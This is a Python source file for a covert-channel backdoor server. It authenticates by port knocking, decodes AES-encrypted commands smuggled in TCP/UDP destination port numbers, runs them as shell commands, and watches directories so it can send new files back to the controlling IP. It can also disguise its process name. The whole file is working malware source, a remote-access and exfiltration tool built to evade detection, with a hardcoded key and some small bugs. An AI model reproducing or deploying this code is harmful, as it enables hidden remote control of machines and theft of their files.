import base64
import argparse
import collections
import logging
import binascii
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from time import sleep
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from random import randint
from Crypto.Cipher import AES
from multiprocessing import Process

CONN_IPS = collections.defaultdict(list)
CMDS = collections.defaultdict(list)
MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
INIT_VALUE = "JohnCenaTheChamp"


class NewFileHandler(FileSystemEventHandler):
    def __init__(self, packet):
        self.packet = packet

    def on_created(self, event):
        filename = os.path.basename(event.src_path)
        f_binary = file_to_binary(filename, event.src_path)
        encrypted_data = ''.join(f_binary)
        send_data(encrypted_data,  self.packet[1].src, self.packet[2].sport, "write")
        print("File sent: {}".format(filename))


def encrypt_val(string):
    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
    encryptedData = base64.b64encode(objAES.encrypt(string))
    return encryptedData


def decrypt_val(string):
    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
    decryptedData = objAES.decrypt(base64.b64decode(string))
    return decryptedData


def verify_root():
    if(os.getuid() != 0):
        exit("This program must be run with root/sudo")


def file_to_binary(file, path):
    f = open(path, "rb")
    header = file + '\0'
    byte = header + f.read()
    binary = list(bin(int('1'+binascii.hexlify(byte), 16))[3:].zfill(8))
    binary = ''.join(binary)
    byte_list = [binary[i:i+8] for i in range(0, len(binary), 8)]
    return byte_list


def data_packet(dest, sport, val1, val2=None):
    if(len(val1) == 1):
        if(val2 is None):
            destport = ord(val1) << 8
        else:
            destport = (ord(val1) << 8) + ord(val2)
    else:
        if(val2 is None):
            destport = int(val1, 2)
        else:
            destport = int(val1 + val2, 2)
    if(args.proto.lower() == "tcp"):
        return IP(dst=dest) / TCP(sport=sport, dport=destport)
    else:
        return IP(dst=dest) / UDP(sport=sport, dport=destport)


def send_end_msg(dest, output_type, sport):
    randPort = randint(1500, 65535)
    if(output_type == "print"):
        type_id = 42424
    elif(output_type == "write"):
        type_id = 41414
    if(args.proto.lower() == "tcp"):
        packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=sport)
    else:
        packet = IP(dst=dest, id=type_id) / UDP(dport=randPort, sport=sport)

    send(packet, verbose=0)


def send_data(msg, ip, sport, output_type):
    msg = encrypt_val(msg)
    for char1, char2 in zip(msg[0::2], msg[1::2]):
        # delay_sleep()
        send(data_packet(ip, sport, char1, char2), verbose=0)
    if(len(msg) % 2):
        # delay_sleep()
        send(data_packet(ip, sport, msg[-1]), verbose=0)
    send_end_msg(ip, output_type, sport)


def run_cmd(packet, cmd):
    output = []
    out = err = None
    try:
        # command, arguments = cmd.split(' ', 1)
        # command = command.rstrip('\0')
        # arguments = arguments.rstrip('\0')
        # arguments = arguments.replace(" ", ", ")
        arguments = ""
        command = cmd.split()
    except ValueError:
        command = cmd.rstrip('\0')
        arguments = ""
    print("Running command: {} {}...".format(command, arguments))
    try:
        if(arguments is not ""):
            out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
        else:
            out, err = Popen(command, stdout=PIPE, stderr=PIPE).communicate()
    except OSError:
        output = "Invalid Command / Command not found"
    if(out):
        output.append(out)
    if(err):
        output.append(err)
    time.sleep(0.5)
    send_data(''.join(output), packet[1].src, packet[2].sport, "print")
    print("Finished")


def watch_dir(packet, path):
    path = path.rstrip('\0')
    event_handler = NewFileHandler(packet)
    observer = Observer()
    observer.schedule(event_handler, path, recursive=False)
    observer.start()

    while True:
        sleep(1)
    observer.stop()
    observer.join()


def read_inst(packet, command):
    command = decrypt_val(command)
    cmd = command.split(' ', 1)
    if(cmd[0] == "run"):
        cmdProc = Process(target=run_cmd, args=(packet, cmd[1],))
        cmdProc.daemon = True
        cmdProc.start()
        # run_cmd(packet, cmd[1])
    elif(cmd[0] == "watch"):
        fileProc = Process(target=watch_dir, args=(packet, cmd[1],))
        fileProc.daemon = True
        fileProc.start()
        # watch_dir(packet, cmd[1])
    else:
        print(cmd)


def decode(packet):
    global CMDS
    sport = packet[2].sport
    if(packet[1].id == 42424):
        read_inst(packet, ''.join(CMDS[sport]))
        CMDS[sport] = ""
        return
    else:
        dport = packet[2].dport
        char1 = chr((dport >> 8) & 0xff)
        char2 = chr(dport & 0xff)
        if(char2 is not None):
            CMDS[sport] += "{}{}".format(char1, char2)
        else:
            CMDS[sport] += "{}".format(char1)


def port_knock_auth(packet):
    global CONN_IPS
    ip = packet[1].src
    dport = packet[2].dport
    sport = packet[2].sport
    access = [2525, 14156, 6364]
    dc = 4242

    # If the connecting IP has connected before
    if(ip in CONN_IPS):
        auth = CONN_IPS[ip]
        # Connecting IP is already authenticated
        if(auth == 3):
            if(dport == dc):
                del CONN_IPS[ip]
                print("{} has disconnected".format(ip))
                return
            decode(packet)
        elif(dport not in access):
            del CONN_IPS[ip]
        elif(dport == access[auth]):
            CONN_IPS[ip] += 1
            if(CONN_IPS[ip == 3]):
                print("{} has connected".format(ip))
        else:
            del CONN_IPS[ip]
    elif(dport == access[0]):
        CONN_IPS[ip] = 1


def main():
    print("Sniffing for {} traffic...".format(args.proto))
    sniff(filter=args.proto.lower(), iface=args.iface, prn=port_knock_auth)


if __name__ == '__main__':
    verify_root()
    parser = argparse.ArgumentParser("Python covert channel server")
    parser.add_argument("-d", "--dname", help="Disguise process title")
    parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
    parser.add_argument("-p", "--proto", help="Protocol to use, can be TCP or UDP")
    args = parser.parse_args()
    if(args.dname is not None):
        import setproctitle
        setproctitle.setproctitle(args.dname)
    if(args.proto is not None):
        if(args.proto.lower() not in ["tcp", "udp"]):
            exit("Invalid protocol specified")
    else:
        args.proto = "TCP"

    try:
        main()
    except KeyboardInterrupt:
        exit("Ctrl+C received. Exiting...")
